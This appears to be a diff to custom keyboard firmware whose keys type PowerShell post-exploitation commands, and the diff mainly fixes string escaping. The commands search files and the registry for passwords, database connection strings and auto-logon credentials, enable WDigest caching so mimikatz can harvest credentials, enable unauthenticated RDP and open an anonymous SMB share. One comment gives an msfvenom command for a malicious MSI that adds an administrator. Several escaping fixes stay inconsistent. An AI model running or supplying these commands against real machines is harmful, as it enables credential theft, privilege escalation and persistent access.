@@ -186,13 +186,13 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
 
     case PS08: // Find configuration files containing “password” string
         if (record->event.pressed) {
-           SEND_STRING("gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"); 
+           SEND_STRING("gci c:\\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"password\""); 
         }
         break;
             
     case PS09: // Find database credentials in configuration files
         if (record->event.pressed) {
-           SEND_STRING("gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"); 
+           SEND_STRING("gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"connectionString\"); 
         }
         break;
             
@@ -228,37 +228,37 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
                        
     case PS15: // Search for SNMP community string in registry
         if (record->event.pressed) {
-           SEND_STRING("gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue"); 
+           SEND_STRING("gci HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse -EA SilentlyContinue"); 
         }
         break;
                        
     case PS16: // Search registry for auto-logon credentials
         if (record->event.pressed) {
-           SEND_STRING("gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select \"Default*\""); 
+           SEND_STRING("gp 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon' | select \"Default*\""); 
         }
         break;
                        
     case PS17: // Check if AlwaysInstallElevated is enabled. if it works, generate the malicious .msi in msfvenom with the following command: msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
         if (record->event.pressed) {
-           SEND_STRING("gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated; gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"); 
+           SEND_STRING("gp 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated; gp 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated"); 
         }
         break;
                        
     case PS18: // Find unquoted service paths
         if (record->event.pressed) {
-           SEND_STRING("gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\Windows*\" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name"); 
+           SEND_STRING("gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name"); 
         }
         break;
                        
     case PS19: // Check for LSASS WDigest caching. If value is 0, mimikatz won't work and you'll have to use the next command. Otherwise enjoy!
         if (record->event.pressed) {
-           SEND_STRING("(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
+           SEND_STRING("(gp registry::HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest).UseLogonCredential"); 
         }
         break;
                        
     case PS20: // Enable LSASS caching in order for mimikatz to work on the target machine
         if (record->event.pressed) {
-           SEND_STRING("sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1"); 
+           SEND_STRING("sp registry::HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest -name UseLogonCredential -value 1"); 
         }
         break;
                        
@@ -270,13 +270,13 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
                        
     case PS22: // Enable RDP connections
         if (record->event.pressed) {
-           SEND_STRING("Get-WmiObject -Class \"Win32_TerminalServiceSetting\" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1); Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\cimv2\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0); Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True"); 
+           SEND_STRING("Get-WmiObject -Class \"Win32_TerminalServiceSetting\" -Namespace root\\cimv2\terminalservices).SetAllowTsConnections(1); Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0); Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True"); 
         }
         break;
                        
     case PS23: // Host discovery using mass DNS reverse lookup
         if (record->event.pressed) {
-           SEND_STRING("$net = "10.10.1."0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\s+\","").replace(\"`r\","").replace(\"`n\"," "); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt"); 
+           SEND_STRING("$net = "10.10.1."0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\\s+\","").replace(\"`r\","").replace(\"`n\"," "); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt"); 
         }
         break;
                        
@@ -294,13 +294,13 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
                        
     case PS26: // Create a guest SMB shared drive
         if (record->event.pressed) {
-           SEND_STRING("new-item \"c:\users\public\share\" -itemtype directory New-SmbShare -Name \"sharedir\" -Path \"C:\users\public\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\"");
+           SEND_STRING("new-item \"c:\users\public\\share\" -itemtype directory New-SmbShare -Name \"sharedir\" -Path \"C:\users\public\\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\"");
         }
         break;
                        
     case PS27: // delete the previously created SMB drive
         if (record->event.pressed) {
-           SEND_STRING("Remove-SmbShare -Name "sharedir" -Force"); 
+           SEND_STRING("Remove-SmbShare -Name \"sharedir\" -Force"); 
         }
         break;
                        
@@ -348,7 +348,7 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
 
     case PS35: // record powershell session to file
         if (record->event.pressed) {
-           SEND_STRING("$Start-Transcript c:\path\to\record.txt"); 
+           SEND_STRING("$Start-Transcript c:\path\\to\record.txt"); 
         }
         break;
 
@@ -366,7 +366,7 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
 
     case PS38: // Check Program Files directories
         if (record->event.pressed) {
-           SEND_STRING("Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"); 
+           SEND_STRING("Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime"); 
         }
         break;
 
@@ -396,13 +396,13 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
 
     case PS43: // List proxy settings
         if (record->event.pressed) {
-           SEND_STRING("gp \"Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\""); 
+           SEND_STRING("gp \"Registry::HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\""); 
         }
         break;
 
     case PS44: // Send an email
         if (record->event.pressed) {
-           SEND_STRING("Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject \"subject\" -Body \"message\" -Attachment c:\path\to\attachment"); 
+           SEND_STRING("Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject \"subject\" -Body \"message\" -Attachment c:\path\\to\attachment"); 
         }
         break;
 
